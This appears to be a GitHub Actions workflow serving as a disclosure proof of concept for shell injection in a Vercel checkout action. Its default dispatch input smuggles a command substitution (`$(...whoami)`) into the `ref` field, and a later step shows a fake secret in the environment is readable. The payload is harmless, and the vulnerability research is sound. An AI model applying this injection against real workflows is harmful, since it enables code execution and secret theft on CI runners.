name: PoC - vercel/repository-dispatch shell injection
# Authorized security research demonstration of CVE-class shell injection in
# vercel/repository-dispatch/actions/checkout@v1. Workflow runs on attacker-controlled
# repo (Kayiz-PT/eve fork) to prove the published Vercel action executes attacker
# commands when given attacker-controllable `inputs.ref`.

on:
  workflow_dispatch:
    inputs:
      payload:
        description: 'Attacker-controllable string flowing into inputs.ref'
        required: true
        default: '$(echo POC_NO_OP_HARMLESS_$(whoami))'

jobs:
  poc:
    runs-on: ubuntu-latest
    env:
      SIMULATED_SECRET: 'fake-token-for-poc-evidence-12345abcdef'
    steps:
      - name: Invoke vulnerable Vercel action with attacker-controlled ref
        # This mirrors what a real consumer would do if they took an `inputs.ref`
        # from any user-controllable source (PR title, branch name, dispatch input).
        # The action.yaml at vercel/repository-dispatch/actions/checkout@v1 interpolates
        # ${{ inputs.ref }} directly into a bash `run:` block (lines 30-32) without
        # env-var indirection -- shell-injectable.
        uses: vercel/repository-dispatch/actions/checkout@v1
        with:
          ref: ${{ inputs.payload }}

      - name: Evidence that secret env was accessible during action execution
        if: always()
        run: |
          echo "If the prior step printed PWNED-runner, RCE happened on this runner."
          echo "SIMULATED_SECRET length confirms env access: ${#SIMULATED_SECRET}"
